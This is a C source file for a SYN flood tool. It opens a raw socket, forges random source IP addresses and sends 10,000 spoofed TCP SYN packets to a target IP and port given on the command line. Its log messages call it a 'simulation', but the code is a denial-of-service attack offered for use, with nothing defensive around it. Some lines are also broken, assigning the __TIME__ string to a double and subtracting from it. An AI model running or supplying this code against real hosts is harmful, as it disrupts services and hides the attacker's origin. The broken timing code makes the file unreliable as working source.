#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>

// Pseudo header needed for checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void random_ip(char *ip_buffer) {
    sprintf(ip_buffer, "%d.%d.%d.%d", 
        rand() % 254 + 1, rand() % 254 + 1, rand() % 254 + 1, rand() % 254 + 1);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Target IP> <Target Port>\n", argv[0]);
        exit(1);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    srand(time(NULL));

    // Open log file
    FILE *log_file = fopen("syn_flood_log.txt", "a");
    if (!log_file) {
        perror("Error opening log file");
        exit(1);
    }
    
    fprintf(log_file, "\n--- SYN Flood Simulation Started at %s ---\n", __TIME__);

    double time_start = __TIME__;
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // IP header
    memset(datagram, 0, 4096);
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->daddr = sin.sin_addr.s_addr;

    // TCP header
    tcph->dest = htons(target_port);
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Socket option to include IP header
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    printf("Starting SYN flood...\n");
    int total_packets = 10000;

    for (int i = 0; i < total_packets; i++) {
        char src_ip[16];
        random_ip(src_ip);
        iph->saddr = inet_addr(src_ip);
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

        tcph->source = htons(rand() % 65535);
        tcph->seq = rand();
        tcph->check = 0;

        // Create pseudo header
        struct pseudo_header psh;
        psh.source_address = inet_addr(src_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudogram[4096];
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

        tcph->check = csum((unsigned short*) pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));

        // Send packet
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        } else {
            // Log sent packet details
            fprintf(log_file, "SEQ = %d TTL[%f]\n", i + 1, __TIME__ - time_start);
            printf("Packet %d sent from %s\n", i + 1, src_ip);
        }

        // Optional delay (if needed)
        // usleep(1000);
    }

    fprintf(log_file, "--- SYN Flood Simulation Ended at %s ---\n", __TIME__);

    // Close log file and socket
    fclose(log_file);
    close(s);

    return 0;
}
